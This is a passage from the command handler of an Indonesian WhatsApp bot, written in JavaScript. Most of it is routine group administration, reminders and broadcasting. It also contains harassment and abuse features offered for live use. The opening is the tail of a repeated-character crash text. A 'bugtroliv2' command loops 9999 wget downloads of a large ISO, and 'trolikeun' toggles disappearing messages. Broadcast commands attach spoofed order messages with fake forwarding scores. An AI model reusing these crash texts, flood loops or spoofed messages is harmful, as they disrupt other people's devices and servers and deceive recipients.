*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*`)
break
case 'trolikeun':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
				syaa.toggleDisappearingMessages(from)
				syaa.toggleDisappearingMessages(from)
				break
				case 'bugtroliv2':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				  if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
				for (let i = 0; i < 9999; i++) {
				exec('wget https://ftp.halifax.rwth-aachen.de/blackarch/iso/blackarch-linux-full-2020.12.01-x86_64.iso', (err, stdout) => {
				if (err) throw err
				console.log('🔥SUKSES🔥')
				console.log('🔥') 
				})
				}
				break
      case "autojoin":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return reply("Khusus di grup");
        if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >------------------
      case 'listonline':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
             if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(syaa.chats.get(ido).presences), syaa.user.jid]
             syaa.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
        /////FUNCTION

//////function end
      case "sider": //copas dari stikerinbot
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await syaa.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await syaa.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        reply(txt, null, {
          contextInfo: {
            mentionedJid: syaa.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!isOwner && !mek.key.fromMe)return sticOwner(from)
        if (!m.quoted) return reply("reply message!");
        let qse = syaa.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        case "out":
          case "kik":
            case "keluar":
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
              if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          syaa.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          syaa.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          syaa.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
        case 'add':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.admin)
                if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut")
                if (args.length < 1) return reply('Yang mau di add jin ya?')
                if (args[0].startsWith('08')) return reply('Gunakan kode negara kak')
                try {
                num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
                syaa.groupAdd(from, [num])
                } catch (e) {
                console.log('Error :', e)
                reply('Gagal menambahkan target, mungkin karena di private')
                }
                break
      case "getbio":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await syaa.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
///kelir
case 'clearall':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					anu = await syaa.chats.all()
					syaa.setMaxListeners(10)
					for (let _ of anu) {
						syaa.clearMessage(_.jid)
					}
					reply('Sukses membersihkan semua pesan')
					break
////NO BET WORT
case 'addbadword':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                    if (!isOwner) return sticOwner(from)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    const bw = body.slice(12)
                    bad.push(bw)
                    fs.writeFileSync('./database/bad.json', JSON.stringify(bad))
                    reply('Success Menambahkan Bad Word!')
                    break
                case 'delbadword':
                    if (!isOwner) return sticOwner(from)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}addbadword [kata kasar]. contoh ${prefix}addbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/bad.json', JSON.stringify(bad))
                    reply('Success Menghapus BAD WORD!')
                    break 
                case 'listbadword':
                    let lbw = `Ini adalah list BAD WORD\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break 
case 'nobadword':///FIX WORK BY ARASYA
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                    if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.admin)
                if (args.length < 1) return reply('Boo :??')
                if (args[0] === 'enable') {
                if (isBadWord) return reply('*fitur BadWord sudah aktif sebelum nya*')
                 	   badword.push(from)
                 	   fs.writeFileSync('./database/badword.json', JSON.stringify(badword))
                  	   reply(`badword is enable`)
              	  } else if (args[0] === 'disable') {
                  	  badword.splice(from, 1)
                 	   fs.writeFileSync('./database/badword.json', JSON.stringify(badword))
                 	    reply(`badword is disable`)
             	   } else {
                 	   reply("Enable Untuk Menyalakan Disable Untuk Mematikan\nContoh:\n/badword enable")
                	}
                    break
case "linkgc":
case "linkgrup":
case "link":
case "linkgrop":
case "linkgroup":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  ///Fix Work By Arasya
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot bukan Admin Cok')
linkgc = await syaa.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein, shareee_`
syaa.sendMessage(from, yeh, text, { quoted: mek })
break
      // Get Name
      case "getname":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          syaa.contacts[ambl] != undefined
            ? syaa.contacts[ambl].sname || syaa.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.groupUpdateDescription(from, `${args.join(" ")}`);
        syaa.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
        case 'setppgrup':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await syaa.downloadMediaMessage(encmedia)
   syaa.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return reply('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await syaa.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   syaa.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break
case 'tutuptime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
syaa.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
syaa.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'leavetime':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (!isGroup) return reply(mess.only.group)

if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
syaa.groupLeave(from);
}, timer)
break;
        case 'setprofile':
				case 'setpp':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				syaa.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await syaa.downloadAndSaveMediaMessage(enmediau)
					await syaa.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
        case 'bc':
syaa.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return reply(mess.only)
					if (args.length < 1) return reply('Teksnya?')
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)

					}

					break
case 'tobc':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
				syaa.updatePresence(from, Presence.composing)
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, audio, { quoted: fakestatus })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, sticker, { quoted: fakestatus, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
		case "bcsticker":
        case "bcstik":
					if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						reply('Suksess broadcast')
					}
					break
         case "bcvideo":
					if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftroli,caption: `*BROADCAST*\n\n${body.slice(9)}`})
						}
						reply('Suksess broadcast')
					}
					break
	case "bcaudio":
					if (!isOwner && !mek.key.fromMe) return sticOwner(from) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftroli})
						}
						reply('Suksess broadcast')
					}
					break
        case "bcgif":
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)  
			        
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli})
						}
						reply('Suksess broadcast')
					}
					break
					
      // Set Name Group
      case "setname":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.groupUpdateSubject(from, `${args.join(" ")}`);
        syaa.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break
      // Group Info
      case "groupinfo":
        case "infogrup":
          case "grupinfo":
            case "infogrup":
             if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return;
        ppUrl = await syaa.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        syaa.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> *Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length} \n\n${groupDesc}`,
        });
        break;
      // Demote Admins
      case "demote":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        syaa.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        syaa.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case "promote":
        case "pm":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        syaa.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        syaa.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "tutup":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        syaa.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
      case "revoke":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "buka":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        syaa.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              syaa.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
